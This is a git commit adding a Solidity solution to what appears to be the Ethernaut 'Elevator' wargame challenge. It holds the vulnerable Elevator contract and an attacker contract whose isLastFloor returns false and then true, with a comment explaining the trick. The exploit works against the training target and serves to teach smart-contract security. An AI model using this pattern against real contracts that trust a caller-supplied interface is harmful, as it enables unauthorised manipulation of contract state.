3a4a38f71fe71f4ebe2b88d081c0479265e9d754
gab0071 <jeicarm7@gmail.com>
2023-03-16 08:13:31 -0500

    done ✔

---
+++ contracts/Building.sol
@@ -0,0 +1,47 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+interface Building {
+    function isLastFloor(uint256) external returns (bool);
+}
+
+contract Elevator {
+    bool public top;
+    uint256 public floor;
+
+    function goTo(uint256 _floor) public {
+        Building building = Building(msg.sender);
+
+        if (!building.isLastFloor(_floor)) {
+            floor = _floor;
+            top = building.isLastFloor(floor);
+        }
+    }
+}
+
+contract ElevatorAttacker is Building {
+    bool public top;
+
+    function goTo(uint256 _floor, address _elevator) public {
+        top = true;
+        Elevator(_elevator).goTo(_floor);
+    }
+
+    function isLastFloor(uint256) external override returns (bool) {
+        top = !top;
+        return top;
+    }
+}
+
+/* 
+We just have to create a contract that implements the Building interface:
+
+interface Building {
+  function isLastFloor(uint256) external returns (bool);
+}
+
+With the only catch that the first time it has to return false to enter the 
+if (!building.isLastFloor(_floor)) {} and the second time it has to return true to satisfy 
+the challenge requirement.
+
+*/
